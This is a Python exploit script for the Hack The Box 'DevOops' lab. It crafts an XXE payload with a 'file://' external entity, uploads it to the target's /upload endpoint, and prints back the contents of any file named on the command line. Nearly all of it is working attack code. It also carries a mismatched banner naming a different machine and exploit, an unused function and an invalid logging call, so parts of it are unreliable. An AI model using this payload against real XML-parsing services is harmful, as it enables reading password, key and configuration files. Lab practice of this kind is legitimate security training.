# -*- coding: utf-8 -*-

# DevOops HTB - XXE + LFI
# CVE: -
# Exploit author: Renan Almeida
# Python script exploit author: Renan Almeida a.k.a. nullarmor <nullarmor@protonmail.com>

import argparse
import base64
import requests
import sys
from builtins import input
from pwn import *


def main():

    # args
    argparser = argparse.ArgumentParser(description='DevOops HTB - XXE + LFI', 
                                        add_help=False)
    main_arg = argparser.add_argument_group("MAIN")
    
    main_arg.add_argument('-h', '--help', 
                            help='Show this help menu', 
                            action='store_true')
                            
    main_arg.add_argument('--file', type=str,
                            help='File to retrieve the contents')
    
    main_arg.add_argument('--burpsuite', action='store_true',
                            help='Enable burpsuite proxy')
                            
    args = argparser.parse_args()
    
    # arg validation
    if args.help:
        argparser.print_help()
        sys.exit(1)
    
    # cons
    file_ = args.file
    burpsuite = args.burpsuite
    
    # proxies
    proxies = { "http": "http://127.0.0.1:8080" }
    
    def string_generator(range_):
        letters = string.ascii_letters
        return ''.join(random.choice(letters) for i in range(range_))
        
    def interactive(randname):
    	exit = False
    	while not exit:
    	    file_ = input("File to read: ")
    	    upload(file_, randname)

    def generate_xml(file_, randname):
        payload_xxe = """<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file://{}"> ]>
        <Content><Subject><Author>&xxe;</Author></Subject></Content>""".format(file_)

        l1 = log.progress("Generating the malicious XML")

        try:
            with open('/tmp/{}.xml'.format(randname),'w') as f:
                f.write(payload_xxe)
                f.close()
        except Exception as e:
            l1.failure("Failed to save the temporary malicious XML to /tmp/{}.xml | ERROR: {}".format(randname, e))
        else:
            l1.success("Success")
            return True

    def upload(file_, randname):
        if generate_xml(file_, randname):
            l1 = log.progress("Uploading the malicious XML")
            
            try:
                files = {
                    'file': ('{}.xml'.format(randname), open('/tmp/{}.xml'.format(randname), 'rb'), 'text/xml')
                }
            except Exception as e:
                l1.failure("Failed to open the temporary malicious XML to /tmp/{}.xml | ERROR: {}".format(randname, e))

            try:
                if burpsuite:
                    r = requests.post("http://10.10.10.91:5000/upload", files=files, proxies=proxies)
                else:
                    r = requests.post("http://10.10.10.91:5000/upload", files=files)
            except Exception as e:
                l1.failure("Failed to upload the malicious XML! | ERROR: {}".format(e))
            else:
                l1.success('Done!')
                try:
                    log.info(r.text.split('Author: ')[1].split(' Subject')[0])
                except:
                    l1.failed("Error, failed to parse the contents of the file!")
    
    # main
    log.info("Obscurity HTB - Python Code Injection RCE")
    log.info("Python script exploit author: nullarmor")
    
    randname = string_generator(8)
    
    upload(file_,randname)
    
if __name__ == "__main__":
    main()
